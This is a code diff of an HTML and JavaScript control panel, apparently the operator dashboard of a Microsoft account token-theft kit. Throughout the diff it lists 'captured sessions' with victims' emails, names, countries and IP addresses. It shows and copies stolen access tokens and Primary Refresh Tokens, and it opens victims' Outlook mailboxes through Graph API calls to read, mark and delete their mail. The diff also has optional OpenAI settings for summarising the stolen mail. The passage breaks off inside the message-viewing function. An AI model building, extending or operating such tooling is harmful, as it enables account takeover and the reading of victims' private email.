@@ -13,7 +13,6 @@
             min-height: 100vh;
         }
         
-        /* Header */
         .header {
             background: #111827;
             border-bottom: 1px solid #1e293b;
@@ -33,30 +32,13 @@
             color: transparent;
         }
         .logo p { font-size: 11px; color: #6b7280; }
-        .stats-badge {
-            display: flex;
-            gap: 20px;
-        }
-        .stat {
-            text-align: center;
-        }
-        .stat-value {
-            font-size: 24px;
-            font-weight: 700;
-            color: #60a5fa;
-        }
-        .stat-label {
-            font-size: 10px;
-            color: #6b7280;
-        }
+        .stats-badge { display: flex; gap: 20px; }
+        .stat { text-align: center; }
+        .stat-value { font-size: 24px; font-weight: 700; color: #60a5fa; }
+        .stat-label { font-size: 10px; color: #6b7280; }
         
-        /* Main Layout */
-        .main {
-            display: flex;
-            min-height: calc(100vh - 100px);
-        }
+        .main { display: flex; min-height: calc(100vh - 100px); }
         
-        /* Sidebar */
         .sidebar {
             width: 260px;
             background: #0f172a;
@@ -77,14 +59,8 @@
         .nav-item:hover { background: #1e293b; color: white; }
         .nav-item.active { background: #3b82f6; color: white; }
         
-        /* Content */
-        .content {
-            flex: 1;
-            padding: 24px;
-            overflow-y: auto;
-        }
+        .content { flex: 1; padding: 24px; overflow-y: auto; }
         
-        /* Cards */
         .card {
             background: #111827;
             border-radius: 16px;
@@ -102,14 +78,12 @@
         .card-title { font-size: 16px; font-weight: 600; }
         .card-body { padding: 20px; }
         
-        /* Tables */
         .table-wrapper { overflow-x: auto; }
         table { width: 100%; border-collapse: collapse; }
         th, td { text-align: left; padding: 12px 16px; border-bottom: 1px solid #1e293b; }
         th { color: #8b8fbf; font-size: 12px; font-weight: 500; }
         td { font-size: 13px; }
         
-        /* Buttons */
         .btn {
             padding: 6px 12px;
             border-radius: 6px;
@@ -121,14 +95,10 @@
         }
         .btn-primary { background: #3b82f6; color: white; }
         .btn-primary:hover { background: #2563eb; }
-        .btn-success { background: #10b981; color: white; }
-        .btn-success:hover { background: #059669; }
         .btn-danger { background: #ef4444; color: white; }
-        .btn-danger:hover { background: #dc2626; }
         .btn-outline { background: transparent; border: 1px solid #2d3748; color: #e0e0e0; }
         .btn-outline:hover { background: #1e293b; }
         
-        /* Form Elements */
         .form-group { margin-bottom: 16px; }
         .form-group label { display: block; margin-bottom: 6px; font-size: 12px; color: #9ca3af; }
         .form-control {
@@ -140,13 +110,10 @@
             color: white;
             font-size: 13px;
         }
-        .form-control:focus { outline: none; border-color: #3b82f6; }
         
-        /* Grid */
         .grid-2 { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
         .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
         
-        /* Modal */
         .modal {
             display: none;
             position: fixed;
@@ -175,13 +142,8 @@
             justify-content: space-between;
         }
         .modal-body { padding: 20px; }
-        .modal-footer { padding: 16px 20px; border-top: 1px solid #1e293b; display: flex; justify-content: flex-end; gap: 10px; }
         
-        /* Mailbox specific */
-        .mail-container {
-            display: flex;
-            height: calc(100vh - 120px);
-        }
+        .mail-container { display: flex; height: calc(100vh - 120px); }
         .mail-folders {
             width: 260px;
             background: #0f172a;
@@ -236,12 +198,11 @@
             font-weight: 500;
         }
         .badge-success { background: #10b981; color: white; }
-        .badge-warning { background: #f59e0b; color: #1a1a1a; }
         
         .view { display: none; }
         .view.active { display: block; }
         
-        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar { width: 6px; }
         ::-webkit-scrollbar-track { background: #1e293b; }
         ::-webkit-scrollbar-thumb { background: #374151; border-radius: 3px; }
     </style>
@@ -266,50 +227,31 @@
     
     <div class="main">
         <div class="sidebar">
-            <div class="nav-item active" data-view="dashboard">
-                <span>📊</span> Dashboard
-            </div>
-            <div class="nav-item" data-view="sessions">
-                <span>📋</span> Sessions
-            </div>
-            <div class="nav-item" data-view="tokens">
-                <span>🔑</span> Tokens
-            </div>
-            <div class="nav-item" data-view="mailbox">
-                <span>📧</span> Mailbox
-            </div>
-            <div class="nav-item" data-view="settings">
-                <span>⚙️</span> Settings
-            </div>
+            <div class="nav-item active" data-view="dashboard"><span>📊</span> Dashboard</div>
+            <div class="nav-item" data-view="sessions"><span>📋</span> Sessions</div>
+            <div class="nav-item" data-view="tokens"><span>🔑</span> Tokens</div>
+            <div class="nav-item" data-view="mailbox"><span>📧</span> Mailbox</div>
+            <div class="nav-item" data-view="settings"><span>⚙️</span> Settings</div>
         </div>
         
         <div class="content">
             <!-- Dashboard View -->
             <div id="dashboardView" class="view active">
                 <div class="grid-3">
-                    <div class="card">
-                        <div class="card-header"><span class="card-title">Total Sessions</span></div>
-                        <div class="card-body"><div class="stat-value" style="font-size: 36px;" id="totalSessions">0</div></div>
-                    </div>
-                    <div class="card">
-                        <div class="card-header"><span class="card-title">Active PRTs</span></div>
-                        <div class="card-body"><div class="stat-value" style="font-size: 36px;" id="totalPRTs">0</div></div>
-                    </div>
-                    <div class="card">
-                        <div class="card-header"><span class="card-title">Last Capture</span></div>
-                        <div class="card-body"><div class="stat-value" style="font-size: 14px;" id="lastCapture">-</div></div>
-                    </div>
+                    <div class="card"><div class="card-header"><span class="card-title">Total Sessions</span></div><div class="card-body"><div class="stat-value" style="font-size: 36px;" id="totalSessions">0</div></div></div>
+                    <div class="card"><div class="card-header"><span class="card-title">Active PRTs</span></div><div class="card-body"><div class="stat-value" style="font-size: 36px;" id="totalPRTs">0</div></div></div>
+                    <div class="card"><div class="card-header"><span class="card-title">Last Capture</span></div><div class="card-body"><div class="stat-value" style="font-size: 14px;" id="lastCapture">-</div></div></div>
                 </div>
+                
+                <div class="card" id="countryStatsCard">
+                    <div class="card-header"><span class="card-title">🌍 Active Sessions by Region</span></div>
+                    <div class="card-body" id="countryStatsBody"><div class="loading">Loading...</div></div>
+                </div>
+                
                 <div class="card">
-                    <div class="card-header">
-                        <span class="card-title">Recent Sessions</span>
-                        <button class="btn btn-outline" onclick="loadDashboard()">Refresh</button>
-                    </div>
+                    <div class="card-header"><span class="card-title">Recent Sessions</span><button class="btn btn-outline" onclick="loadDashboard()">Refresh</button></div>
                     <div class="table-wrapper">
-                        <table id="recentTable">
-                            <thead><tr><th>Email</th><th>Name</th><th>Type</th><th>Captured</th></tr></thead>
-                            <tbody id="recentBody"><tr><td colspan="4" class="loading">Loading...</td></tr></tbody>
-                        </table>
+                        <table id="recentTable"><thead><tr><th>Email</th><th>Name</th><th>Country</th><th>IP</th><th>Captured</th></tr></thead><tbody id="recentBody"><tr><td colspan="5" class="loading">Loading...</td></tr></tbody></table>
                     </div>
                 </div>
             </div>
@@ -317,15 +259,9 @@
             <!-- Sessions View -->
             <div id="sessionsView" class="view">
                 <div class="card">
-                    <div class="card-header">
-                        <span class="card-title">All Captured Sessions</span>
-                        <button class="btn btn-danger" onclick="clearAllSessions()">Clear All</button>
-                    </div>
+                    <div class="card-header"><span class="card-title">All Captured Sessions</span><button class="btn btn-danger" onclick="clearAllSessions()">Clear All</button></div>
                     <div class="table-wrapper">
-                        <table id="sessionsTable">
-                            <thead><tr><th>ID</th><th>Email</th><th>Name</th><th>Type</th><th>Captured</th><th>Expires</th><th>Action</th></tr></thead>
-                            <tbody id="sessionsBody"><tr><td colspan="7" class="loading">Loading...</td></tr></tbody>
-                        </table>
+                        <table id="sessionsTable"><thead><tr><th>ID</th><th>Email</th><th>Name</th><th>Country</th><th>IP</th><th>Type</th><th>Captured</th><th>Expires</th><th>Actions</th></tr></thead><tbody id="sessionsBody"><tr><td colspan="9" class="loading">Loading...</td></tr></tbody></table>
                     </div>
                 </div>
             </div>
@@ -336,19 +272,13 @@
                     <div class="card">
                         <div class="card-header"><span class="card-title">Access Tokens</span></div>
                         <div class="table-wrapper">
-                            <table id="accessTokensTable">
-                                <thead><tr><th>User</th><th>Resource</th><th>Issued</th><th>Expires</th><th>Action</th></tr></thead>
-                                <tbody id="accessTokensBody"><tr><td colspan="5" class="loading">Loading...</td></tr></tbody>
-                            </table>
+                            <table id="accessTokensTable"><thead><tr><th>User</th><th>Resource</th><th>Issued</th><th>Expires</th><th>Action</th></tr></thead><tbody id="accessTokensBody"><tr><td colspan="5" class="loading">Loading...</td></tr></tbody></table>
                         </div>
                     </div>
                     <div class="card">
                         <div class="card-header"><span class="card-title">Refresh Tokens (PRT)</span></div>
                         <div class="table-wrapper">
-                            <table id="refreshTokensTable">
-                                <thead><tr><th>User</th><th>Resource</th><th>Action</th></tr></thead>
-                                <tbody id="refreshTokensBody"><tr><td colspan="3" class="loading">Loading...</td></tr></tbody>
-                            </table>
+                            <table id="refreshTokensTable"><thead><tr><th>User</th><th>Resource</th><th>Action</th></tr></thead><tbody id="refreshTokensBody"><tr><td colspan="3" class="loading">Loading...</td></tr></tbody></table>
                         </div>
                     </div>
                 </div>
@@ -357,16 +287,12 @@
             <!-- Mailbox View -->
             <div id="mailboxView" class="view">
                 <div class="card">
-                    <div class="card-header">
-                        <span class="card-title">Select a session to open mailbox</span>
-                    </div>
+                    <div class="card-header"><span class="card-title">Select a session to open mailbox</span></div>
                     <div class="card-body">
                         <div class="grid-2">
                             <div>
                                 <label>Select User Session</label>
-                                <select id="mailboxUserSelect" class="form-control" style="margin-top: 8px;">
-                                    <option value="">Select a user...</option>
-                                </select>
+                                <select id="mailboxUserSelect" class="form-control" style="margin-top: 8px;"><option value="">Select a user...</option></select>
                                 <button class="btn btn-primary" style="margin-top: 12px;" onclick="openMailbox()">📧 Open Mailbox</button>
                             </div>
                             <div id="mailboxInfo"></div>
@@ -381,54 +307,19 @@
                     <div class="card">
                         <div class="card-header"><span class="card-title">Resource Selector</span></div>
                         <div class="card-body">
-                            <div class="form-group">
-                                <label>Active Resource</label>
-                                <select id="activeResource" class="form-control">
-                                    <option value="graph">Graph API (Outlook/OneDrive)</option>
-                                    <option value="prt">PRT Token (Device Registration)</option>
-                                </select>
-                            </div>
-                            <div class="form-group">
-                                <label>API Version</label>
-                                <select id="apiVersion" class="form-control">
-                                    <option value="1">v1 (resource parameter)</option>
-                                    <option value="2">v2 (scope parameter)</option>
-                                </select>
-                            </div>
+                            <div class="form-group"><label>Active Resource</label><select id="activeResource" class="form-control"><option value="graph">Graph API (Outlook/OneDrive)</option><option value="prt">PRT Token (Device Registration)</option></select></div>
+                            <div class="form-group"><label>API Version</label><select id="apiVersion" class="form-control"><option value="1">v1 (resource parameter)</option><option value="2">v2 (scope parameter)</option></select></div>
                             <button class="btn btn-primary" onclick="saveResourceSettings()">Save Settings</button>
                         </div>
                     </div>
-                    
                     <div class="card">
                         <div class="card-header"><span class="card-title">🤖 OpenAI Integration</span></div>
                         <div class="card-body">
-                            <div class="form-group">
-                                <label>Enable AI Features</label>
-                                <select id="openaiEnabled" class="form-control">
-                                    <option value="false">Disabled</option>
-                                    <option value="true">Enabled</option>
-                                </select>
-                            </div>
-                            <div class="form-group">
-                                <label>API Key</label>
-                                <input type="password" id="openaiApiKey" class="form-control" placeholder="sk-...">
-                            </div>
-                            <div class="form-group">
-                                <label>Model</label>
-                                <select id="openaiModel" class="form-control">
-                                    <option value="gpt-3.5-turbo">GPT-3.5 Turbo (Fast & Cheap)</option>
-                                    <option value="gpt-4">GPT-4 (Powerful)</option>
-                                </select>
-                            </div>
-                            <div class="form-group">
-                                <label>Max Tokens</label>
-                                <input type="number" id="openaiMaxTokens" class="form-control" value="500">
-                            </div>
-                            <div class="form-group">
-                                <label>Temperature</label>
-                                <input type="range" id="openaiTemperature" min="0" max="2" step="0.1" value="0.7">
-                                <span id="tempValue">0.7</span>
-                            </div>
+                            <div class="form-group"><label>Enable AI Features</label><select id="openaiEnabled" class="form-control"><option value="false">Disabled</option><option value="true">Enabled</option></select></div>
+                            <div class="form-group"><label>API Key</label><input type="password" id="openaiApiKey" class="form-control" placeholder="sk-..."></div>
+                            <div class="form-group"><label>Model</label><select id="openaiModel" class="form-control"><option value="gpt-3.5-turbo">GPT-3.5 Turbo</option><option value="gpt-4">GPT-4</option></select></div>
+                            <div class="form-group"><label>Max Tokens</label><input type="number" id="openaiMaxTokens" class="form-control" value="500"></div>
+                            <div class="form-group"><label>Temperature</label><input type="range" id="openaiTemperature" min="0" max="2" step="0.1" value="0.7"><span id="tempValue">0.7</span></div>
                             <button class="btn btn-primary" onclick="saveOpenAISettings()">Save OpenAI Settings</button>
                         </div>
                     </div>
@@ -439,52 +330,27 @@
     
     <!-- Mailbox Modal -->
     <div id="mailboxModal" class="modal">
-        <div class="modal-content" style="max-width: 95%; width: 95%; height: 85vh; max-height: 85vh;">
-            <div class="modal-header">
-                <h3 id="mailboxTitle">Mailbox</h3>
-                <button class="btn btn-outline" onclick="closeMailboxModal()">✕</button>
-            </div>
-            <div class="modal-body" style="padding: 0; height: calc(100% - 60px);">
-                <div class="mail-container" id="mailboxContainer">
-                    <div class="loading">Loading mailbox...</div>
-                </div>
-            </div>
+        <div class="modal-content" style="max-width: 95%; width: 95%; height: 85vh;">
+            <div class="modal-header"><h3 id="mailboxTitle">Mailbox</h3><button class="btn btn-outline" onclick="closeMailboxModal()">✕</button></div>
+            <div class="modal-body" style="padding: 0; height: calc(100% - 60px);"><div class="mail-container" id="mailboxContainer"><div class="loading">Loading mailbox...</div></div></div>
         </div>
     </div>
     
     <script>
         const API_BASE = '';
         
-        // ============================================
-        // Helper Functions
-        // ============================================
         async function apiCall(endpoint, options = {}) {
             try {
-                const response = await fetch(endpoint, {
-                    ...options,
-                    headers: { 'Content-Type': 'application/json', ...options.headers }
-                });
+                const response = await fetch(endpoint, { ...options, headers: { 'Content-Type': 'application/json' } });
                 if (!response.ok) throw new Error(`HTTP ${response.status}`);
                 return await response.json();
-            } catch (err) {
-                console.error('API call failed:', err);
-                return null;
-            }
+            } catch (err) { return null; }
         }
         
-        function formatDate(dateStr) {
-            if (!dateStr) return 'Unknown';
-            return new Date(dateStr).toLocaleString();
-        }
+        function formatDate(dateStr) { return dateStr ? new Date(dateStr).toLocaleString() : 'Unknown'; }
+        function escapeHtml(str) { if (!str) return ''; return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]); }
         
-        function escapeHtml(str) {
-            if (!str) return '';
-            return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]);
-        }
-        
-        // ============================================
         // Navigation
-        // ============================================
         document.querySelectorAll('.nav-item').forEach(item => {
             item.addEventListener('click', () => {
                 const view = item.dataset.view;
@@ -492,7 +358,6 @@
                 item.classList.add('active');
                 document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
                 document.getElementById(`${view}View`).classList.add('active');
-                
                 if (view === 'dashboard') loadDashboard();
                 if (view === 'sessions') loadSessions();
                 if (view === 'tokens') loadTokens();
@@ -501,115 +366,74 @@
             });
         });
         
-        // ============================================
         // Dashboard
-        // ============================================
         async function loadDashboard() {
             const sessions = await apiCall('/api/sessions');
             if (sessions && sessions.sessions) {
                 document.getElementById('totalSessions').innerHTML = sessions.total || sessions.sessions.length;
                 document.getElementById('statSessions').innerHTML = sessions.sessions.length;
-                
                 const recent = sessions.sessions.slice(0, 5);
-                document.getElementById('recentBody').innerHTML = recent.map(s => `
-                    <tr><td>${escapeHtml(s.email)}</td><td>${escapeHtml(s.name || '-')}</td><td>${escapeHtml(s.type || 'Graph API')}</td><td>${formatDate(s.capturedAt)}</td></tr>
-                `).join('');
-                
-                if (recent.length) {
-                    document.getElementById('lastCapture').innerHTML = formatDate(recent[0].capturedAt);
-                }
+                document.getElementById('recentBody').innerHTML = recent.map(s => `<tr><td style="color:#60a5fa;">${escapeHtml(s.email)}</td><td>${escapeHtml(s.name || '-')}</td><td>${escapeHtml(s.country || 'Unknown')}</td><td><code>${escapeHtml(s.ip || 'Unknown')}</code></td><td>${formatDate(s.capturedAt)}</td></tr>`).join('');
+                if (recent.length) document.getElementById('lastCapture').innerHTML = formatDate(recent[0].capturedAt);
             }
-            
             const tokens = await apiCall('/api/list_refresh_tokens');
-            if (tokens) {
-                document.getElementById('totalPRTs').innerHTML = tokens.length;
-                document.getElementById('statPRT').innerHTML = tokens.length;
+            if (tokens) { document.getElementById('totalPRTs').innerHTML = tokens.length; document.getElementById('statPRT').innerHTML = tokens.length; }
+            await loadCountryStats();
+        }
+        
+        async function loadCountryStats() {
+            const stats = await apiCall('/api/country_stats');
+            if (stats && stats.countries) {
+                const countriesHtml = Object.entries(stats.countries).map(([country, count]) => `<div style="display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #1e293b;"><span>${country}</span><span class="badge badge-success">${count} session(s)</span></div>`).join('');
+                document.getElementById('countryStatsBody').innerHTML = countriesHtml || '<div>No data</div>';
             }
         }
         
-        // ============================================
         // Sessions
-        // ============================================
         async function loadSessions() {
             const data = await apiCall('/api/sessions');
             if (data && data.sessions) {
-                document.getElementById('sessionsBody').innerHTML = data.sessions.map(s => `
-                    <tr>
-                        <td>${s.id}</td>
-                        <td style="color:#60a5fa;">${escapeHtml(s.email)}</td>
-                        <td>${escapeHtml(s.name || '-')}</td>
-                        <td><span class="badge badge-success">${escapeHtml(s.type || 'Graph API')}</span></td>
-                        <td>${formatDate(s.capturedAt)}</td>
-                        <td>${formatDate(s.expiresAt)}</td>
-                        <td><button class="btn btn-outline" style="padding: 4px 8px;" onclick="openMailboxForUser('${escapeHtml(s.email)}')">📧 Open Mailbox</button></td>
-                    </tr>
-                `).join('');
+                document.getElementById('sessionsBody').innerHTML = data.sessions.map(s => `<tr><td>${s.id}</td><td style="color:#60a5fa;">${escapeHtml(s.email)}</td><td>${escapeHtml(s.name || '-')}</td><td>${escapeHtml(s.country || 'Unknown')}</td><td><code>${escapeHtml(s.ip || 'Unknown')}</code></td><td><span class="badge badge-success">${escapeHtml(s.type || 'Graph API')}</span></td><td>${formatDate(s.capturedAt)}</td><td>${s.hasPRT ? 'Permanent (PRT)' : formatDate(s.expiresAt)}</td>
+                    <td><button class="btn btn-outline" style="padding: 2px 6px;" onclick="viewAccessToken('${escapeHtml(s.email)}')">🔑 View Token</button> ${s.hasPRT ? `<button class="btn btn-outline" style="padding: 2px 6px;" onclick="viewPRT('${escapeHtml(s.email)}')">🔄 View PRT</button>` : ''}<button class="btn btn-primary" style="padding: 2px 6px;" onclick="openMailboxForUser('${escapeHtml(s.email)}')">📧 Mailbox</button></td></tr>`).join('');
             }
+        }
+        
+        async function viewAccessToken(email) {
+            const data = await apiCall(`/api/session/token/${encodeURIComponent(email)}`);
+            if (data && data.access_token) { alert(`Access Token for ${email}:\n\n${data.access_token}`); navigator.clipboard.writeText(data.access_token); }
+            else alert('Failed to get access token');
+        }
+        
+        async function viewPRT(email) {
+            const data = await apiCall(`/api/session/token/${encodeURIComponent(email)}`);
+            if (data && data.refresh_token) { alert(`PRT for ${email}:\n\n${data.refresh_token}`); navigator.clipboard.writeText(data.refresh_token); }
+            else alert('No PRT found');
         }
         
         async function clearAllSessions() {
-            if (confirm('⚠️ Clear all sessions? This will delete ALL tokens.')) {
-                await apiCall('/api/sessions/clear', { method: 'DELETE' });
-                loadDashboard();
-                loadSessions();
-                loadTokens();
-            }
+            if (confirm('Clear all sessions?')) { await apiCall('/api/sessions/clear', { method: 'DELETE' }); loadDashboard(); loadSessions(); loadTokens(); }
         }
         
-        // ============================================
         // Tokens
-        // ============================================
         async function loadTokens() {
             const accessTokens = await apiCall('/api/list_access_tokens');
-            if (accessTokens) {
-                document.getElementById('accessTokensBody').innerHTML = accessTokens.map(t => `
-                    <tr>
-                        <td>${escapeHtml(t.user)}</td>
-                        <td>${escapeHtml(t.resource)}</td>
-                        <td>${formatDate(t.issued_at)}</td>
-                        <td>${formatDate(t.expires_at)}</td>
-                        <td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.accesstoken)}')">Copy</button></td>
-                    </tr>
-                `).join('');
-            }
-            
+            if (accessTokens) { document.getElementById('accessTokensBody').innerHTML = accessTokens.map(t => `<tr><td>${escapeHtml(t.user)}</td><td>${escapeHtml(t.resource)}</td><td>${formatDate(t.issued_at)}</td><td>${formatDate(t.expires_at)}</td><td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.accesstoken)}')">Copy</button></td></tr>`).join(''); }
             const refreshTokens = await apiCall('/api/list_refresh_tokens');
-            if (refreshTokens) {
-                document.getElementById('refreshTokensBody').innerHTML = refreshTokens.map(t => `
-                    <tr>
-                        <td>${escapeHtml(t.user)}</td>
-                        <td>${escapeHtml(t.resource)}</td>
-                        <td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.refreshtoken)}')">Copy PRT</button></td>
-                    </tr>
-                `).join('');
-            }
+            if (refreshTokens) { document.getElementById('refreshTokensBody').innerHTML = refreshTokens.map(t => `<tr><td>${escapeHtml(t.user)}</td><td>${escapeHtml(t.resource)}</td><td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.refreshtoken)}')">Copy PRT</button></td></tr>`).join(''); }
         }
         
-        function copyToken(token) {
-            navigator.clipboard.writeText(token);
-            alert('Token copied to clipboard!');
-        }
+        function copyToken(token) { navigator.clipboard.writeText(token); alert('Token copied!'); }
         
-        // ============================================
         // Mailbox
-        // ============================================
         async function loadMailboxSelect() {
             const sessions = await apiCall('/api/sessions');
             const select = document.getElementById('mailboxUserSelect');
-            
-            if (sessions && sessions.sessions) {
-                select.innerHTML = '<option value="">Select a user...</option>' + 
-                    sessions.sessions.map(s => `<option value="${escapeHtml(s.email)}">${escapeHtml(s.email)} (${escapeHtml(s.name || 'No name')})</option>`).join('');
-            }
+            if (sessions && sessions.sessions) { select.innerHTML = '<option value="">Select a user...</option>' + sessions.sessions.map(s => `<option value="${escapeHtml(s.email)}">${escapeHtml(s.email)} (${escapeHtml(s.name || 'No name')})</option>`).join(''); }
         }
         
         async function openMailbox() {
-            const select = document.getElementById('mailboxUserSelect');
-            const email = select.value;
-            if (!email) {
-                alert('Please select a user');
-                return;
-            }
+            const email = document.getElementById('mailboxUserSelect').value;
+            if (!email) { alert('Please select a user'); return; }
             await openMailboxForUser(email);
         }
         
@@ -617,7 +441,6 @@
             document.getElementById('mailboxTitle').innerHTML = `📧 Mailbox - ${email}`;
             document.getElementById('mailboxModal').classList.add('open');
             document.getElementById('mailboxContainer').innerHTML = '<div class="loading"><div class="spinner"></div> Loading folders...</div>';
-            
             await loadMailboxFolders(email);
         }
         
@@ -625,92 +448,32 @@
             try {
                 const response = await fetch(`${API_BASE}/api/mail/folders/${encodeURIComponent(email)}`);
                 const data = await response.json();
-                
-                if (data.error) {
-                    document.getElementById('mailboxContainer').innerHTML = `<div class="loading">❌ ${data.error}</div>`;
-                    return;
-                }
-                
-                const folders = data.value || [];
-                renderMailbox(email, folders);
-            } catch (err) {
-                document.getElementById('mailboxContainer').innerHTML = `<div class="loading">❌ Failed to load folders: ${err.message}</div>`;
-            }
+                if (data.error) { document.getElementById('mailboxContainer').innerHTML = `<div class="loading">❌ ${data.error}</div>`; return; }
+                renderMailbox(email, data.value || []);
+            } catch (err) { document.getElementById('mailboxContainer').innerHTML = `<div class="loading">❌ ${err.message}</div>`; }
         }
         
-        let currentMailboxEmail = null;
-        let currentFolderId = 'inbox';
-        let currentEmails = [];
+        let currentMailboxEmail = null, currentFolderId = 'inbox', currentEmails = [];
         
         async function renderMailbox(email, folders) {
             currentMailboxEmail = email;
-            
-            const container = document.getElementById('mailboxContainer');
-            container.innerHTML = `
-                <div class="mail-folders" id="mailFolders">
-                    ${folders.map(f => `
-                        <div class="folder-item ${f.id === 'inbox' ? 'active' : ''}" onclick="loadFolderEmails('${email}', '${f.id}')">
-                            <span>📁 ${f.displayName}</span>
-                            <span class="badge">${f.unreadItemCount || 0}</span>
-                        </div>
-                    `).join('')}
-                </div>
-                <div class="mail-list" id="mailList">
-                    <div class="loading"><div class="spinner"></div> Select a folder</div>
-                </div>
+            document.getElementById('mailboxContainer').innerHTML = `
+                <div class="mail-folders" id="mailFolders">${folders.map(f => `<div class="folder-item ${f.id === 'inbox' ? 'active' : ''}" onclick="loadFolderEmails('${email}', '${f.id}')"><span>📁 ${f.displayName}</span><span class="badge">${f.unreadItemCount || 0}</span></div>`).join('')}</div>
+                <div class="mail-list" id="mailList"><div class="loading">Select a folder</div></div>
             `;
-            
-            // Load inbox by default
             loadFolderEmails(email, 'inbox');
         }
         
         async function loadFolderEmails(email, folderId) {
             currentFolderId = folderId;
-            
             document.getElementById('mailList').innerHTML = '<div class="loading"><div class="spinner"></div> Loading emails...</div>';
-            
             try {
                 const response = await fetch(`${API_BASE}/api/mail/${encodeURIComponent(email)}/${folderId}`);
                 const data = await response.json();
-                
-                if (data.error) {
-                    document.getElementById('mailList').innerHTML = `<div class="loading">❌ ${data.error}</div>`;
-                    return;
-                }
-                
+                if (data.error) { document.getElementById('mailList').innerHTML = `<div class="loading">❌ ${data.error}</div>`; return; }
                 currentEmails = data.value || [];
-                renderEmailList(currentEmails);
-            } catch (err) {
-                document.getElementById('mailList').innerHTML = `<div class="loading">❌ ${err.message}</div>`;
-            }
-        }
-        
-        function renderEmailList(emails) {
-            if (!emails || emails.length === 0) {
-                document.getElementById('mailList').innerHTML = '<div class="loading">📭 No emails in this folder</div>';
-                return;
-            }
-            
-            document.getElementById('mailList').innerHTML = emails.map(email => `
-                <div class="email-item ${!email.isRead ? 'unread' : ''}" onclick="loadFullEmail('${email.id}')">
-                    <div class="email-subject">
-                        ${escapeHtml(email.subject || '(No subject)')}
-                        ${email.hasAttachments ? ' 📎' : ''}
-                    </div>
-                    <div class="email-from">${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address)}</div>
-                    <div class="email-preview">${escapeHtml(email.bodyPreview || '')}</div>
-                </div>
-            `).join('');
-            
-            // Add AI summary button if OpenAI is enabled
-            if (document.getElementById('openaiEnabled')?.value === 'true') {
-                const summaryBtn = document.createElement('button');
-                summaryBtn.className = 'btn btn-outline';
-                summaryBtn.style.margin = '10px';
-                summaryBtn.innerHTML = '🤖 AI Summary';
-                summaryBtn.onclick = () => generateAIEmailSummary(emails);
-                document.getElementById('mailList').prepend(summaryBtn);
-            }
+                document.getElementById('mailList').innerHTML = currentEmails.map(email => `<div class="email-item ${!email.isRead ? 'unread' : ''}" onclick="loadFullEmail('${email.id}')"><div class="email-subject">${escapeHtml(email.subject || '(No subject)')}${email.hasAttachments ? ' 📎' : ''}</div><div class="email-from">${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address)}</div><div class="email-preview">${escapeHtml(email.bodyPreview || '')}</div></div>`).join('');
+            } catch (err) { document.getElementById('mailList').innerHTML = `<div class="loading">❌ ${err.message}</div>`; }
         }
         
         async function loadFullEmail(messageId) {
@@ -718,48 +481,15 @@
             modal.style.cssText = 'position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.9); z-index:2000; display:flex; align-items:center; justify-content:center;';
             modal.innerHTML = '<div class="loading"><div class="spinner"></div> Loading message...</div>';
             document.body.appendChild(modal);
-            
             try {
                 const response = await fetch(`${API_BASE}/api/mail/message/${encodeURIComponent(currentMailboxEmail)}/${messageId}`);
                 const email = await response.json();
-                
-                modal.innerHTML = `
-                    <div style="background:#111827; border-radius:16px; width:90%; max-width:800px; max-height:80vh; overflow:auto;">
-                        <div style="padding:16px; border-bottom:1px solid #1e293b; display:flex; justify-content:space-between;">
-                            <h3>${escapeHtml(email.subject || '(No subject)')}</h3>
-                            <button class="btn btn-outline" onclick="this.closest('div').parentElement.remove()">✕</button>
-                        </div>
-                        <div style="padding:20px;">
-                            <div style="margin-bottom:16px;">
-                                <strong>From:</strong> ${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address)}<br>
-                                <strong>To:</strong> ${escapeHtml(email.toRecipients?.map(r => r.emailAddress.address).join(', ') || 'Unknown')}<br>
-                                <strong>Date:</strong> ${new Date(email.receivedDateTime).toLocaleString()}
-                            </div>
-                            <div style="border-top:1px solid #1e293b; padding-top:16px;">
-                                ${email.body?.content || email.bodyPreview || 'No content'}
-                            </div>
-                            <div style="margin-top:20px; display:flex; gap:10px;">
-                                <button class="btn btn-primary" onclick="replyToEmail('${email.id}')">↩️ Reply</button>
-                                <button class="btn btn-success" onclick="markAsRead('${email.id}')">✓ Mark Read</button>
-                                <button class="btn btn-danger" onclick="deleteEmail('${email.id}')">🗑️ Delete</button>
-                            </div>
-                        </div>
-                    </div>
-                `;
-            } catch (err) {
-                modal.innerHTML = `<div style="background:#111827; border-radius:16px; padding:20px;"><p>❌ Failed to load message: ${err.message}</p><button class="btn btn-primary" onclick="this.closest('div').parentElement.remove()">Close</button></div>`;
-            }
-        }
-        
-        async function replyToEmail(messageId) {
-            alert('Reply feature - compose your message');
+                modal.innerHTML = `<div style="background:#111827; border-radius:16px; width:90%; max-width:800px; max-height:80vh; overflow:auto;"><div style="padding:16px; border-bottom:1px solid #1e293b; display:flex; justify-content:space-between;"><h3>${escapeHtml(email.subject || '(No subject)')}</h3><button class="btn btn-outline" onclick="this.closest('div').parentElement.remove()">✕</button></div><div style="padding:20px;"><div style="margin-bottom:16px;"><strong>From:</strong> ${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address)}<br><strong>To:</strong> ${escapeHtml(email.toRecipients?.map(r => r.emailAddress.address).join(', ') || 'Unknown')}<br><strong>Date:</strong> ${new Date(email.receivedDateTime).toLocaleString()}</div><div style="border-top:1px solid #1e293b; padding-top:16px;">${email.body?.content || email.bodyPreview || 'No content'}</div><div style="margin-top:20px; display:flex; gap:10px;"><button class="btn btn-primary" onclick="markAsRead('${email.id}')">✓ Mark Read</button><button class="btn btn-danger" onclick="deleteEmail('${email.id}')">🗑️ Delete</button></div></div></div>`;
